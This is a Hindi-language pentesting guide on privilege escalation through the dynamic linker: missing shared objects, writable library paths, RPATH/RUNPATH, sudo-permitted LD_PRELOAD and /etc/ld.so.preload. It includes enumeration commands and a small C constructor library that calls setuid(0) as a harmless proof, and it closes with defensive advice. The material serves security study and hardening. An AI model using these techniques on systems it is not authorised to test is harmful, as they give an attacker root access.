# SUID Shared Library और Linker का दुरुपयोग

{{#include ../../banners/hacktricks-training.md}}

SUID binaries की आम तौर पर सीधे command execution के लिए जाँच की जाती है, लेकिन custom SUID programs में dynamic linker के ज़रिए भी vulnerabilities हो सकती हैं। आम बात सरल है: एक privileged executable ऐसे path या configuration से code लोड करता है, जिसे कम privilege वाला user नियंत्रित कर सकता है।<sup>[[1]](#references)</sup>

यह पेज सामान्य technique patterns पर केंद्रित है: missing libraries, writable library directories, `RPATH`/`RUNPATH`, sudo के ज़रिए `LD_PRELOAD`, linker configuration, और SUID hardlink confusion।

इन checks के पीछे ELF program headers, dynamic section और loader के व्यवहार के लिए, [ELF basic information](../../binary-exploitation/basic-stack-binary-exploitation-methodology/elf-tricks.md) देखें।

## तेज़ Enumeration

असामान्य SUID files खोजकर और यह जाँचकर शुरुआत करें कि वे dynamically linked हैं या नहीं:<sup>[[1]](#references)[[3]](#references)</sup>

```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```

किसी अपरिचित executable के लिए `readelf` का उपयोग करें: [`ldd` किसी अविश्वसनीय ELF interpreter को execute कर सकता है](https://man7.org/linux/man-pages/man1/ldd.1.html)। `readelf` direct dependencies दिखाता है, इसलिए loader द्वारा वास्तव में चुने गए path की अलग से पुष्टि करें।<sup>[[1]](#references)[[3]](#references)</sup>

Non-standard locations, custom application paths, package-managed directories के बाहर root के स्वामित्व वाले binaries, और writable directories से लोड की गई dependencies पर ध्यान दें।<sup>[[1]](#references)</sup>

उपयोगी writeability checks:

```bash
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```

## Missing Shared Object Injection

कुछ custom SUID binaries ऐसे shared object को load करने की कोशिश करते हैं जो मौजूद नहीं होता। अगर यह missing path attacker के नियंत्रण वाली directory के अंदर है, तो binary attacker द्वारा दिया गया code effective user के रूप में load कर सकती है।<sup>[[1]](#references)</sup>

यही सीमा **sudo के ज़रिए चलाने की अनुमति वाले custom binary** पर भी लागू होती है, जब वह caller द्वारा लिखी जा सकने वाली home या configuration directory के अंदर मौजूद किसी absolute `.so` path पर `dlopen()` कॉल करता है। यह late library load `ldd` और ELF `NEEDED` entries में दिखाई नहीं दे सकता। `strings` से सीमित समीक्षा या **unprivileged** invocation को trace करने पर इस्तेमाल किया जाने वाला path पता चल सकता है; application password या menu choice इस lookup को नियंत्रित कर सकती है। इसे privilege escalation मानने से पहले प्रभावी sudo rule, सटीक path और parent-directory permissions की पुष्टि करें, और यह भी सुनिश्चित करें कि privileged invocation उस lookup तक पहुँचता है। केवल उसे enumerate करने के लिए sudo target invoke न करें।

`strace` के syscall filter से विफल library lookups खोजें:<sup>[[2]](#references)</sup>

```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```

यदि binary `libexample.so` के लिए किसी writable path में खोज करता है, तो एक minimal proof library में constructor का उपयोग किया जा सकता है। Validation के दौरान proof-of-impact को harmless रखें:<sup>[[6]](#references)</sup>

```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
    setuid(0);
    setgid(0);
    system("id > /tmp/suid-so-ran");
}
```

इसे उसी सटीक फ़ाइलनाम के साथ build करें जिसे binary load करने की कोशिश करता है:

```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```

शोषण योग्य स्थिति केवल missing library नहीं है। हमलावर के लिए किसी ऐसे path पर compatible shared object रखना संभव होना चाहिए जिसे privileged loader स्वीकार करे।<sup>[[1]](#references)</sup>

## Writable Library Directory

कभी-कभी सभी dependencies मौजूद होती हैं, लेकिन उन्हें resolve करने के लिए इस्तेमाल की जाने वाली directories में से कोई एक writable होती है। इससे loaded library को बदलना या उसी नाम की higher-priority library रखना संभव हो सकता है।<sup>[[1]](#references)</sup>

यही जाँच ऐसे custom ELF पर भी लागू होती है जिसे **sudo के ज़रिए चलाने की अनुमति हो**, भले ही ELF में SUID bit न हो और अनुमत RunAs account root न हो। इसकी `DT_NEEDED` entries की तुलना उस library pathname से करें जिसे loader resolve करेगा; फिर जाँचें कि क्या caller उस file को लिख सकता है या writable, searchable parent directory के ज़रिए उसे replace कर सकता है। sudo RunAs के सटीक rule, symlinks और ACLs, loader policy, और यह पुष्टि करें कि target process library को higher-privileged account के रूप में load करता है। Writable `.so` या dependency name अकेले केवल एक lead है; sudo command चलाए बिना metadata जाँचें।<sup>[[1]](#references)[[3]](#references)[[5]](#references)</sup>

Dependency paths की जाँच करें:<sup>[[1]](#references)[[3]](#references)</sup>

```bash
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```

यदि directory writable है, तो lab में copy-safe approach से validate करें। Live host पर system libraries को replace करने से concurrently शुरू हो रही processes में library versions inconsistent हो सकते हैं।<sup>[[8]](#references)</sup>

### chroot के अंदर writable libraries

सिर्फ chroot करने से inherited file descriptors बंद नहीं होते और न ही filesystem की सभी access सीमित होती हैं। यदि sandbox अपने नए root के बाहर की ओर इशारा करने वाला directory descriptor छोड़ देता है, और jailed process उस descriptor को dereference कर सकती है (उदाहरण के लिए, किसी accessible `/proc/<pid>/fd/` entry के ज़रिए), तो host paths तक पहुंच बनी रह सकती है। यह filesystem boundary की समस्या है; इससे अपने-आप root privileges नहीं मिलते।<sup>[[11]](#references)[[12]](#references)</sup>

अलग से जांचें कि क्या jailed user उस library directory में write कर सकता है जिसे **host root-SUID executable** jail से launch होने पर इस्तेमाल करेगा। Loader, process के filesystem view में dependencies resolve करता है, इसलिए वहां attacker-controlled library, SUID program की effective identity के साथ execute हो सकती है। Exact executable, उसका SUID bit और mount policy, descriptor का target और access permissions, jail का library search path, और यह पुष्टि करें कि program वास्तव में host executable तक पहुंच सकता है। Sandbox launcher पर file capability, writable jail, या host SUID binary अकेले सिर्फ एक lead हैं; पूरी chain sandbox के implementation पर निर्भर करती है।<sup>[[1]](#references)[[11]](#references)[[12]](#references)</sup>

## RPATH और RUNPATH

`RPATH` और `RUNPATH` dynamic-section entries हैं, जो loader को बताती हैं कि libraries कहां खोजनी हैं। SUID programs में ये खतरनाक हैं, यदि ये attacker-writable directories की ओर इशारा करती हैं।<sup>[[1]](#references)</sup>

इन्हें detect करें:<sup>[[3]](#references)[[10]](#references)</sup>

```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```

उदाहरण जोखिमभरा आउटपुट:

```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```

यदि `/opt/app/lib` writable है और binary को `libcustom.so` की आवश्यकता है, तो attacker वहाँ दुर्भावनापूर्ण `libcustom.so` रख सकता है:<sup>[[1]](#references)</sup>

```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```

`RPATH` और `RUNPATH` सभी resolution विवरणों में एक जैसे नहीं होते, लेकिन privilege-escalation की समीक्षा में व्यावहारिक सवाल एक ही है: क्या SUID binary किसी library name को खोजने के लिए attacker-writable directory में देखती है?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH और SUID

सामान्य programs के लिए, `LD_PRELOAD` और `LD_LIBRARY_PATH` shared object loading को बाध्य या प्रभावित कर सकते हैं। SUID programs के लिए, dynamic loader आमतौर पर secure-execution mode में चला जाता है और खतरनाक environment variables को अनदेखा करता है।<sup>[[1]](#references)</sup>

इसका मतलब है कि केवल इसलिए कि user `LD_PRELOAD` सेट कर सकता है, एक सामान्य SUID binary आमतौर पर vulnerable नहीं होती:<sup>[[1]](#references)</sup>

```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```

सामान्य अपवाद sudo policy है, जो target के लिए command-line environment assignment की अनुमति देती है, जैसे `SETENV` tag या लागू `setenv` option। यदि target dynamically linked है और sudo `LD_PRELOAD=/path/to/library` स्वीकार करता है, तो target caller के नियंत्रण वाला code load कर सकता है। प्रभावी rule और target identity जाँचें। केवल `LD_PRELOAD` को `env_keep` में जोड़ना उन systems पर पर्याप्त नहीं है जहाँ dynamic loader, SUID `sudo` process शुरू होने से पहले inherited `LD_PRELOAD` हटा देता है; command-line assignment का मूल्यांकन sudo अपने startup के बाद करता है।<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
sudo -l
# Check SETENV/setenv and the target command's allowed arguments
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```

इन मामलों को एक-दूसरे से न मिलाएँ; ऊपर दिए गए loader और sudo policy के नियम इनके बीच अंतर स्पष्ट करते हैं:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- सामान्य SUID binary के विरुद्ध `LD_PRELOAD`: आमतौर पर secure execution द्वारा ब्लॉक किया जाता है।
- विशेषाधिकार प्राप्त, dynamically linked target के लिए sudo command-line assignment के रूप में स्वीकार किया गया `LD_PRELOAD`: संभावित रूप से exploitable।
- writable path में अनुपस्थित `.so`: तब exploitable, जब SUID binary स्वाभाविक रूप से उस path को load करती हो।
- writable directory पर `RPATH`/`RUNPATH`: तब exploitable, जब किसी आवश्यक library को नियंत्रित किया जा सके।
- `/etc/ld.so.preload` या linker config पर write access: system-wide और high impact।

## Linker Configuration

`ld.so` linker cache और `/etc/ld.so.preload` का उपयोग करता है; `ldconfig` यह cache `/etc/ld.so.conf` और उसमें शामिल की गई files से बनाता है, जो आमतौर पर `/etc/ld.so.conf.d/` में होती हैं।<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

उच्च-मूल्य वाली जाँचें:

```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```

Writable linker configuration आमतौर पर किसी एक vulnerable SUID binary से अधिक गंभीर होती है, क्योंकि यह कई dynamically linked processes को प्रभावित कर सकती है। `/etc/ld.so.preload` खास तौर पर खतरनाक है, क्योंकि यह privileged processes में किसी shared object को जबरन लोड कर सकती है।<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID Hardlink Confusion

Hardlinks एक ही SUID inode को कई नामों के तहत दिखा सकते हैं।<sup>[[9]](#references)</sup> यह किसी privileged helper को छिपाने, cleanup को भ्रमित करने या सरल path-based review को bypass करने में उपयोगी है।

एक से अधिक link वाली SUID files खोजें:<sup>[[9]](#references)</sup>

```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```

एक ही inode के सभी paths की जांच करें:<sup>[[9]](#references)</sup>

```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```

दुरुपयोग यह नहीं है कि hardlink permissions बदल देता है। दुरुपयोग path confusion है: किसी privileged inode तक ऐसे नाम के ज़रिए पहुँचा जा सकता है जिसकी defenders या scripts अपेक्षा नहीं करते।<sup>[[9]](#references)</sup> inode और hardlink workflow के बारे में अधिक जानकारी के लिए, [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md) देखें।

## रक्षात्मक टिप्पणियाँ

- जहाँ संभव हो, SUID binaries को न्यूनतम रखें, उनका audit करें और उन्हें package-managed रखें।
- ऐसे `RPATH`/`RUNPATH` entries से बचें जो writable या application-managed directories की ओर इंगित करते हों।<sup>[[1]](#references)[[8]](#references)</sup>
- Library directories को root-owned रखें और regular users के लिए non-writable रखें।<sup>[[8]](#references)</sup>
- sudo के ज़रिए `LD_PRELOAD`, `LD_LIBRARY_PATH` या ऐसे ही loader variables को बनाए न रखें।<sup>[[1]](#references)[[5]](#references)</sup>
- `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` और अप्रत्याशित SUID files पर नज़र रखें।<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- hardlinked SUID files की समीक्षा करें और standard system paths के बाहर मौजूद custom SUID wrappers की जाँच करें।<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — Linux मैनुअल पेज](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — Linux मैनुअल पेज](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — Linux मैनुअल पेज](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — Linux मैनुअल पेज](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [सामान्य Attributes (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — Linux मैनुअल पेज](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Dynamic Linker Hardening (The GNU C Library)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard Links (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
- [11] [chroot(2) — Linux मैनुअल पेज](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [12] [proc_pid_fd(5) — Linux मैनुअल पेज](https://man7.org/linux/man-pages/man5/proc_pid_fd.5.html)
{{#include ../../banners/hacktricks-training.md}}
